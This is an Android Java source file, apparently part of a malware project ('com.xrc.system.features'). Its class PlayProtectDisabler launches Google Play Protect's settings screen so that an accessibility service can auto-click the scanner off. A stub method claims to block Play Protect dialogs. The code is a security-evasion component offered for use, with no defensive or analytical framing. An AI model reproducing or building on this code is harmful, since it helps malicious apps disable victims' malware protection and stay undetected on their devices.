package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.xrc.system.core.Constants;

public class PlayProtectDisabler {
    private static final String TAG = Constants.TAG + ":PlayProtect";
    private static PlayProtectDisabler instance;
    private final Context ctx;

    private PlayProtectDisabler(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized PlayProtectDisabler get(Context ctx) {
        if (instance == null) {
            instance = new PlayProtectDisabler(ctx);
        }
        return instance;
    }

    public void disable() {
        try {
            // Open Play Protect settings via accessibility auto-click
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setPackage("com.google.android.gms");
            intent.setClassName("com.google.android.gms",
                    "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Play Protect disable failed", e);
            try {
                Intent fallback = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                fallback.setData(Uri.parse("package:" + ctx.getPackageName()));
                fallback.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(fallback);
            } catch (Exception e2) {
                Log.e(TAG, "Fallback failed", e2);
            }
        }
    }

    public void disableViaAccessibility() {
        // Triggered by accessibility service when Play Protect dialog appears
        Log.i(TAG, "Play Protect dialog detected — blocking");
    }
}
